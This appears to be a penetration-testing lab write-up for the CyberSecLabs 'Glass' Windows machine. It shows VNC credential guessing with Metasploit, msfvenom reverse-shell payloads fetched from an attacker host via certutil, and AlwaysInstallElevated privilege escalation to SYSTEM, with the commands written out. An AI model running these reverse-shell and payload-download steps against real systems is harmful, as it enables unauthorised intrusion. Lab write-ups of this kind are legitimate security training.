---
description: https://www.cyberseclabs.co.uk/labs/info/Glass/
---

# Glass

![](<../../../.gitbook/assets/image (624).png>)

## Nmap

```
sudo nmap 172.31.1.25 -p- -sS -sC

PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: GLASS
|   NetBIOS_Domain_Name: GLASS
|   NetBIOS_Computer_Name: GLASS
|   DNS_Domain_Name: Glass
|   DNS_Computer_Name: Glass
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-21T18:33:17+00:00
| ssl-cert: Subject: commonName=Glass
| Not valid before: 2020-07-22T18:19:53
|_Not valid after:  2021-01-21T18:19:53
|_ssl-date: 2020-12-21T18:33:17+00:00; 0s from scanner time.
5800/tcp  open  vnc-http
|_http-title: TightVNC desktop [glass]
5900/tcp  open  vnc
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49675/tcp open  unknown                                                                                                                                                                                                                    
49676/tcp open  unknown                                                                                                                                                                                                                    
```

## SMB

As per standard we can start with a quick null authentication check with SMB. However, we receive no access.

![](<../../../.gitbook/assets/image (625).png>)

## VNC

Looking at ports 5800 and 5900 we do have VNC running. `metasploit` has a login scanner module that we can use to enumerate VNC logins `auxiliary/scanner/vnc/vnc_login`

Set the RHOSTS and RPORT settings and then run with default settings.

![](<../../../.gitbook/assets/image (626).png>)

`metasploit` picks up a login of \<blank>:password. Kali comes prei-nstalled with a tool called `vncviewer` which we can use to try and log into the remote machine with.

## Initial Foothold

When running the `vncviewer` command on Kali you will be prompted for server IP and password. After entering these you should be presented with the screen below.

![](<../../../.gitbook/assets/image (627).png>)

I will now create a reverse shell and then host it on a `Python SimpleHTTPServer` and download it to the victim machine with `certutil.exe`

First in Kali we create a reverse shell executable with `msfvenom`.

```
msfvenom -p windows/x64/shell/reverse_tcp lhost=<IP> lport=4455 -f exe -o <Destination>
```

We can then move to the directory location of the payload we just created and host a Python HTTP server.

```
sudo python2 -m SimpleHTTPServer 80
```

We can now open a `netcat` listener on our attacking machine specifying the listening port as the one we defined in the `msfvenom` payload.

```
nc -lvp 4455
```

On the attacking machine we can open `cmd.exe` and then use `certutil.exe` to download the payload we created.

```
cmd.exe /c certutil.exe -f -urlcache -split http://10.10.0.176/connect.exe
```

When ready invoke the payload.

![](<../../../.gitbook/assets/image (628).png>)

We now get a shell on our attacking machine.

![](<../../../.gitbook/assets/image (629).png>)

## Privilege Escalation

A quick check on our groups and privileges shows we do not belong to any interesting groups or have any interesting permissions.

![](<../../../.gitbook/assets/image (630).png>)

The `systeminfo` command shows we are running on Windows Server 2019.

![](<../../../.gitbook/assets/image (631).png>)

We can upload winPEAS.exe to the server to further help us with the privilege escalation stage of our attack.

winPEAS soon picks up AlwaysInstallElevated being set to 1 which means true.

![](<../../../.gitbook/assets/image (632).png>)

When AlwaysInstallElevated is set to 1 MSI files that are invoked will run with SYSTEM permissions. We can use `msfvenom` to create a reverse shell MSI payload which we can then run on the system.

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=4466 -f msi -o <Destination>
```

We can then start another `netcat` listener on our attacking machine and again download the payload to the victim server with `certutil.exe`

![](<../../../.gitbook/assets/image (633) (1).png>)

Our `netcat` listener then picks up a shell and we confirm we are running as SYSTEM.

![](<../../../.gitbook/assets/image (635).png>)
